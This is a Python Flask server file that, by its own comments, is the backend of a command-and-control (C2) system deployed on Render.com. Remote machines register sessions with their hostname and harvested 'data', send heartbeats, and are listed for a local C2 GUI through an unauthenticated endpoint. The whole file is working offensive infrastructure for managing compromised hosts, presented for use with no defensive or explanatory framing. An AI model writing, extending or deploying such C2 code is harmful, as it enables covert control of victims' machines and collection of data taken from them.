from flask import Flask, request, jsonify
import time

# --- MODIFICATION ---
# Instead of a queue, we use a dictionary to store session data.
# This will act as our simple, in-memory database.
SESSIONS = {}
# --------------------

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get("session_id")
    
    if session_id:
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received new session registration from {data.get('hostname')}")
        SESSIONS[session_id] = {
            "session_id": session_id,
            "hostname": data.get("hostname"),
            "data": data.get("data"),
            "last_seen": time.time()
        }
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    session_id = data.get("session_id")
    
    if session_id and session_id in SESSIONS:
        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received heartbeat from {session_id[:8]}")
        # Update the 'last_seen' timestamp for this session
        SESSIONS[session_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"}), 200

# --- NEW ENDPOINT FOR THE GUI ---
@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    """
    This new endpoint is for our local C2 GUI to call.
    It returns all the session data stored on the server.
    """
    return jsonify(list(SESSIONS.values()))
# --------------------------------

def run_server():
    # This function is now only used by Render.com.
    # We will not be running a local web server anymore.
    # The 'host' must be '0.0.0.0' for Render.
    app.run(host='0.0.0.0', port=5001)